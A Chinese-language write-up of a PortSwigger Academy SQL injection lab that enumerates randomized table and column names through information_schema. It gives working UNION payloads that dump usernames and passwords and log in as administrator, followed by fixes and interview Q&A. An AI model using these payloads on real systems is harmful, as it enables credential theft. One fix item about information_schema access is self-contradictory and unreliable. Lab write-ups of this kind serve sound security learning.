# SQL 注入：列出非 Oracle 数据库的内容

| 项 | 内容 |
|---|---|
| 来源 | PortSwigger Academy |
| 难度 | PRACTITIONER |
| 模块 | SQL 注入 |
| 日期 | 2026-09-18 |
| 耗时 | 待补充 |

## 一、漏洞原理

前面 004 是通过**猜**表名（`users`）读到数据的。这一题**把猜这条路堵死了**：

> **题目的表名和列名是随机生成的** —— 类似 `users_abcdef`、`username_abcdef`、`password_abcdef`。

所以**必须**先问数据库自己有什么表、什么列，再读数据。方法就是 004 第三节讲过的那套：**`information_schema` 元数据枚举**。

这一题的意义在于：**它用一个真实靶场证明"猜"是不可靠的，枚举才是通用能力。**

### 完整的攻击链（三步）

```
① 枚举表名   →  information_schema.tables
② 枚举列名   →  information_schema.columns
③ 读取数据   →  从真实的表名 / 列名读
```

**顺序不能颠倒** —— 不知道表名，第③步无从下手。

## 二、复现步骤

**第 0 步：确认列数与字符串列**

```
category=Gifts' UNION SELECT 'abc','def'--
```
→ 正常返回，确认 **2 列且都是字符串类型**

**第 1 步：列出库里的所有表**

```
category=Gifts' UNION SELECT table_name,NULL FROM information_schema.tables--
```

→ 页面回显大量表名。**找出装着用户凭据的那张表** —— 名字形如 `users_abcdef`（`abcdef` 是随机后缀）。

**第 2 步：列出这张表的列**

```
category=Gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
```

→ 找出用户名列和口令列，形如 `username_abcdef` / `password_abcdef`。

**第 3 步：读取内容**

```
category=Gifts' UNION SELECT username_abcdef,password_abcdef FROM users_abcdef--
```

→ 拿到所有用户的用户名与口令。

**第 4 步：登录**

取 `administrator` 那行的口令，回登录页登录 → 过关。

**关键点**：第 2 步的 `WHERE table_name='...'` 里，表名要填**第 1 步里看到的真实名字**（含随机后缀）；第 3 步的两个列名同理，要填**第 2 步里看到的真实名字**。

## 三、根本原因

- 用户输入被拼进 SQL 执行（同源）
- **本題多暴露一层**：应用账号有权读 `information_schema`。这让攻击者从"盲猜"升级为"测绘" —— **不知道库结构也能完整摸清**
- 也说明**"命名隐蔽"不是安全措施**。靶场故意随机化表名列名，但枚举一次就全部暴露 —— 靠命名让人猜不到，只是 obscurity，不是防御

## 四、修复方案

1. **参数化查询** —— 根治
2. **数据库账号最小权限** —— 应用账号只授予业务必需的表和操作；**禁止访问 `information_schema` 之外的数据字典**。即便注入成功，也枚举不出结构
3. **口令哈希存储** —— 读到的是哈希而非明文，削掉"读出口令即登录"的杀伤力
4. **关闭详细错误回显** —— 不给报错型探针

## 五、面试问答

**Q：怎么在不猜表名的前提下拿到数据？**
A：查 `information_schema.tables` 列表名，再查 `information_schema.columns` 列列名，拿到真实名字后再查数据。顺序是**枚举 → 读取**。

**Q：`information_schema` 是什么？哪些数据库有？**
A：数据库自带的元数据目录（记录库、表、列、类型）。MySQL、PostgreSQL、SQL Server 都有；**Oracle 没有**，要用 `all_tables` / `all_tab_columns`。

**Q：如果只能回显一列怎么办？**
A：用 `group_concat()`（MySQL）把多个值拼成一格返回，例如 `SELECT group_concat(table_name) FROM information_schema.tables`；或加 `LIMIT 1 OFFSET n` 逐条翻页。

**Q：枚举出的表很多，怎么快速定位？**
A：按名字特征筛。实战中可用 `WHERE table_name LIKE '%user%'`，或限定当前库（MySQL 用 `table_schema=database()`）。

## 六、参考

- [Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
- [Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database)

## 标签

`#SQL注入` `#information_schema` `#元数据枚举` `#跨表读取`
